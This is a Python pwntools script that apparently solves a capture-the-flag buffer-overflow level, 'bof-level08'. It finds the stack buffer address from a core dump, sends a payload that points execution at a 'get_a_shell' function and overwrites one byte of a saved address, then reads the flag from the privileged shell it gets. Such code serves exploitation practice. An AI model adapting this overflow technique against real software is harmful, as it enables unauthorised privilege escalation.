# SETUP BOILERPLATE
from pwn import *
import os

padding = 32 + (0xd00 - 0xca0)

DEBUG = False # toggles gdb.debug or process
elf = ELF('./bof-level08') # replace this with the actual level

# crash the process to get a core file and find the buffer address (still boilerplate)
io = process('./bof-level08', env={"a":"a" * padding}, setuid=False)
io.sendline(cyclic(128)) # send 1000 junk characters
io.wait()
core = io.corefile
buffer_address = core.stack.find(cyclic(20))
print(core.stack)
os.unlink(core.path) # delete the file now that we're done with it

# launch the main process (still boilerplate)
if DEBUG:
    context.log_level = 'DEBUG'
    context.terminal = ['tmux', 'splitw', '-h']
    io = gdb.debug("./bof-level08", env={"a":"a"*padding}, gdbscript='''
    b *0x0000000000400727
    continue
    ''')
else:
    io = process('./bof-level08', env={"a":"a"*padding})

# END SETUP BOILERPLATE
# BEGIN CHALLENGE-SPECIFIC CODE
get_a_shell = p64(elf.symbols["get_a_shell"])

max_len = 129
offset = 0x0

print(buffer_address)
payload = b"a" * 8 + get_a_shell + (max_len - 16 - 1) * b"a" + p8(buffer_address & 0xff)

io.sendline(payload)

# END CHALLENGE-SPECIFIC CODE
# BEGIN FLAG RETRIEVAL BOILERPLATE

import re
io.sendlineafter(b'Spawning a privileged shell', b'cat flag')
flag = re.search(br'candl\{[ -z|~]*}', io.recvregex(br'candl\{[ -z|~]*}')).group(0)
print(flag)
